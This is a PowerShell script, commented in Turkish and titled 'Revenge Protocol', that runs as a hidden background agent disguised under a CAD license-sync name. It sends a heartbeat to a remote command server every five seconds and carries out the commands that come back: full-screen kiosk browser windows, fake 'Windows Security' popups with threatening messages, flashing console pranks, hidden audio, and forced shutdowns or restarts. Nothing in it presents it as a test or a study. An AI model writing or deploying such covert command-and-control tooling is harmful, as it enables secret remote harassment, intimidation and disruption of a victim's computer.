# Revenge Protocol — Windows arka plan aracı (PowerShell)
# Panelden komut gelene kadar EKRANDA HİÇBİR ŞEY AÇMAZ; yalnızca sunucuya kalp atışı gönderir.
$ErrorActionPreference = 'SilentlyContinue'

$script:AgentMutex = $null
try {
  $script:AgentMutex = New-Object System.Threading.Mutex($false, 'Global\QSteelCAD_LisansSenkron_Agent')
  if (-not $script:AgentMutex.WaitOne(0, $false)) { exit 0 }
} catch { exit 0 }

function Write-AgentLog([string]$Message) {
  try {
    $dir = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol'
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    $line = ('{0} {1}' -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message)
    Add-Content -LiteralPath (Join-Path $dir 'agent.log') -Value $line -Encoding UTF8
  } catch { }
}

function Get-ConfigPath {
  if ($env:REVENGE_CONFIG) { return $env:REVENGE_CONFIG }
  return Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol\config.json'
}

function Load-Config {
  if ($env:REVENGE_API_URL) {
    return @{
      apiUrl      = $env:REVENGE_API_URL.TrimEnd('/')
      agentId     = $(if ($env:REVENGE_AGENT_ID) { $env:REVENGE_AGENT_ID } else { 'dev-agent' })
      secret      = $(if ($env:REVENGE_AGENT_SECRET) { $env:REVENGE_AGENT_SECRET } else { 'dev-secret-change-me-32chars!!' })
      registerKey = $null
    }
  }
  $path = Get-ConfigPath
  if (-not (Test-Path -LiteralPath $path)) { throw "config yok: $path" }
  $raw = Get-Content -LiteralPath $path -Raw | ConvertFrom-Json
  return @{
    apiUrl      = [string]$raw.apiUrl
    agentId     = [string]$raw.agentId
    secret      = [string]$raw.secret
    registerKey = [string]$raw.registerKey
  }
}

function Save-Config($cfg) {
  $path = Get-ConfigPath
  $dir = Split-Path -Parent $path
  if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
  $obj = [ordered]@{
    apiUrl  = $cfg.apiUrl
    agentId = $cfg.agentId
    secret  = $cfg.secret
  }
  if ($cfg.registerKey -and $cfg.registerKey.Length -gt 3) {
    $obj.registerKey = $cfg.registerKey
  }
  ($obj | ConvertTo-Json) | Set-Content -LiteralPath $path -Encoding UTF8
}

function Register-Agent($cfg) {
  $body = @{
    agentId     = $cfg.agentId
    secret      = $cfg.secret
    hostname    = $env:COMPUTERNAME
    registerKey = $cfg.registerKey
  } | ConvertTo-Json
  Invoke-RestMethod -Method POST -Uri ($cfg.apiUrl + '/api/agent/register') -ContentType 'application/json' -Body $body | Out-Null
}

function Send-Heartbeat($cfg) {
  $body = @{
    agentId  = $cfg.agentId
    secret   = $cfg.secret
    hostname = $env:COMPUTERNAME
  } | ConvertTo-Json
  return Invoke-RestMethod -Method POST -Uri ($cfg.apiUrl + '/api/agent/heartbeat') -ContentType 'application/json' -Body $body -TimeoutSec 25
}

function Invoke-RegisterIfNeeded($cfg) {
  if (-not $cfg.registerKey -or $cfg.registerKey.Length -lt 4) { return $cfg }
  try {
    Register-Agent $cfg
    Save-Config $cfg
    Write-AgentLog 'register ok'
  } catch {
    Write-AgentLog ('register fail: ' + $_.Exception.Message)
  }
  return Load-Config
}

function Get-ChromePath {
  $paths = @()
  foreach ($hive in @('Registry::HKEY_LOCAL_MACHINE', 'Registry::HKEY_CURRENT_USER')) {
    try {
      $key = Get-Item -Path "$hive\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" -ErrorAction SilentlyContinue
      if ($key) {
        $def = $key.GetValue('')
        if ($def) { $paths += [string]$def }
        $path = $key.GetValue('Path')
        if ($path) { $paths += (Join-Path $path 'chrome.exe') }
      }
    } catch { }
  }
  $paths += @(
    (Join-Path $env:ProgramFiles 'Google\Chrome\Application\chrome.exe'),
    (Join-Path ${env:ProgramFiles(x86)} 'Google\Chrome\Application\chrome.exe'),
    (Join-Path $env:LocalAppData 'Google\Chrome\Application\chrome.exe')
  )
  foreach ($p in ($paths | Select-Object -Unique)) {
    if ($p -and (Test-Path -LiteralPath $p)) { return $p }
  }
  return $null
}

function Open-Kiosk([string]$Url) {
  if (-not $Url) { return }
  $chrome = Get-ChromePath
  if (-not $chrome) {
    Write-AgentLog ('open_url FAIL: chrome.exe yok. url=' + $Url)
    return
  }
  $profile = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol\chrome-session'
  if (-not (Test-Path $profile)) { New-Item -ItemType Directory -Path $profile -Force | Out-Null }
  Write-AgentLog ('open_url chrome incognito: ' + $Url)
  # Ayrı user-data-dir: açık Chrome bayrakları yutmasın, IE'ye düşmesin
  Start-Process -FilePath $chrome -ArgumentList @(
    "--user-data-dir=$profile",
    '--incognito',
    '--new-window',
    '--start-fullscreen',
    '--no-first-run',
    '--no-default-browser-check',
    '--disable-infobars',
    $Url
  )
}

function Invoke-Shutdown([bool]$Restart) {
  if ($Restart) {
    shutdown.exe /r /t 0 /f
  } else {
    shutdown.exe /s /t 0 /f
  }
}

$script:SoundsJob = $null
$script:CmdJob = $null

function Stop-CmdPrank {
  if ($script:CmdJob -and $script:CmdJob.Id) {
    Stop-Process -Id $script:CmdJob.Id -Force -ErrorAction SilentlyContinue
    $script:CmdJob = $null
  }
}

function Invoke-CmdPrank($cmd) {
  Stop-CmdPrank
  $worker = Join-Path $PSScriptRoot 'cmd-prank-worker.ps1'
  if (-not (Test-Path -LiteralPath $worker)) {
    Write-AgentLog 'cmd_prank FAIL: worker yok'
    return
  }
  $mode = if ($cmd.mode) { [string]$cmd.mode } else { 'chaos' }
  $flashCount = if ($cmd.flashCount) { [int]$cmd.flashCount } else { 6 }
  $flashMs = if ($cmd.flashMs) { [int]$cmd.flashMs } else { 140 }
  $flashPlainMs = if ($cmd.flashPlainMs) { [int]$cmd.flashPlainMs } else { 70 }
  $loopCount = if ($cmd.loopCount) { [int]$cmd.loopCount } else { 200 }
  $lines = @('20.10 UNUTULMADI.', '18.10 LOG BULUNDU...', 'DECRYPTING...')
  if ($cmd.lines) {
    $lines = @($cmd.lines | ForEach-Object { [string]$_ } | Where-Object { $_.Trim().Length -gt 0 })
    if ($lines.Count -lt 1) { $lines = @('20.10') }
  }
  $dir = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol'
  if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
  $linesFile = Join-Path $dir 'cmd-lines.txt'
  [System.IO.File]::WriteAllLines($linesFile, $lines, [System.Text.UTF8Encoding]::new($false))
  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  Write-AgentLog ('cmd_prank mode=' + $mode)
  # Start-Job masaüstünde pencere açmaz — etkileşimli süreç şart
  $script:CmdJob = Start-Process -FilePath $ps -PassThru -ArgumentList @(
    '-NoProfile', '-ExecutionPolicy', 'Bypass',
    '-File', $worker,
    '-Mode', $mode,
    '-FlashCount', $flashCount,
    '-FlashMs', $flashMs,
    '-FlashPlainMs', $flashPlainMs,
    '-LoopCount', $loopCount,
    '-LinesFile', $linesFile
  )
}

function Invoke-WinAlert($cmd) {
  $script = Join-Path $PSScriptRoot 'win-alert.ps1'
  if (-not (Test-Path -LiteralPath $script)) {
    Write-AgentLog 'win_alert FAIL: win-alert.ps1 yok'
    return
  }
  $msg = if ($cmd.message) { [string]$cmd.message } else { '20.10 UNUTULMADI.' }
  $sec = if ($cmd.durationSec) { [int]$cmd.durationSec } else { 12 }
  $dir = Join-Path $env:ProgramData 'QSteelCAD\RevengeProtocol'
  if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
  $msgFile = Join-Path $dir 'last-win-alert.txt'
  [System.IO.File]::WriteAllText($msgFile, $msg, [System.Text.UTF8Encoding]::new($false))
  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  $preview = $msg.Substring(0, [Math]::Min(60, $msg.Length))
  Write-AgentLog ('win_alert start: ' + $preview)
  $escaped = ($msg -replace '"', '""') -replace "`r`n|`n|`r", '" & vbCrLf & "'
  $vbsPath = Join-Path $dir 'win-alert-run.vbs'
  $vbs = "Set sh = CreateObject(""WScript.Shell"")`r`nsh.Popup ""$escaped"", $sec, ""Windows Güvenliği"", 48`r`n"
  [System.IO.File]::WriteAllText($vbsPath, $vbs, [System.Text.Encoding]::Unicode)
  Start-Process -FilePath "$env:SystemRoot\System32\wscript.exe" -ArgumentList @('//nologo', $vbsPath) | Out-Null
  Start-Process -FilePath $ps -ArgumentList @(
    '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Sta',
    '-File', $script, '-MessageFile', $msgFile, '-DurationSec', $sec
  ) | Out-Null
}

function Stop-FunnySounds {
  if ($script:SoundsJob -and $script:SoundsJob.Id) {
    Stop-Process -Id $script:SoundsJob.Id -Force -ErrorAction SilentlyContinue
    $script:SoundsJob = $null
  }
}

function Invoke-FunnySounds([int]$DurationSec) {
  if ($DurationSec -lt 1) { $DurationSec = 60 }
  Stop-FunnySounds
  $player = Join-Path $PSScriptRoot 'play-sounds.ps1'
  if (-not (Test-Path -LiteralPath $player)) {
    Write-AgentLog 'sounds FAIL: play-sounds.ps1 yok'
    return
  }
  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  Write-AgentLog ('sounds sec=' + $DurationSec)
  $script:SoundsJob = Start-Process -FilePath $ps -PassThru -WindowStyle Hidden -ArgumentList @(
    '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden',
    '-File', $player, '-DurationSec', $DurationSec
  )
}

function Invoke-CommandPayload($cmd) {
  if (-not $cmd) { return }
  $kind = if ($cmd.kind) { [string]$cmd.kind } else { '?' }
  Write-AgentLog ('exec kind=' + $kind)
  switch ($cmd.kind) {
    'scenario' { if ($cmd.url) { Open-Kiosk $cmd.url } }
    'youtube'  { if ($cmd.url) { Open-Kiosk $cmd.url } }
    'open_url' { if ($cmd.url) { Open-Kiosk $cmd.url } }
    'flash' {
      if ($cmd.message) { Invoke-WinAlert $cmd }
      elseif ($cmd.url) { Open-Kiosk $cmd.url }
    }
    'win_alert' { Invoke-WinAlert $cmd }
    'sounds'   {
      $sec = 90
      if ($cmd.durationSec) { $sec = [int]$cmd.durationSec }
      Invoke-FunnySounds $sec
    }
    'cmd_prank' { Invoke-CmdPrank $cmd }
    'shutdown' { Stop-FunnySounds; Stop-CmdPrank; Invoke-Shutdown $false }
    'restart'  { Stop-FunnySounds; Stop-CmdPrank; Invoke-Shutdown $true }
  }
}

Write-AgentLog 'agent start'
$cfg = Load-Config
$cfg = Invoke-RegisterIfNeeded $cfg

while ($true) {
  try {
    $resp = Send-Heartbeat $cfg
    Write-AgentLog 'heartbeat ok'
    Invoke-CommandPayload $resp.command
  } catch {
    $err = $_.Exception.Message
    Write-AgentLog ('heartbeat fail: ' + $err)
    if ($err -match '401|403|Yetkisiz|Unauthorized') {
      $cfg = Invoke-RegisterIfNeeded $cfg
    }
  }
  Start-Sleep -Seconds 5
}
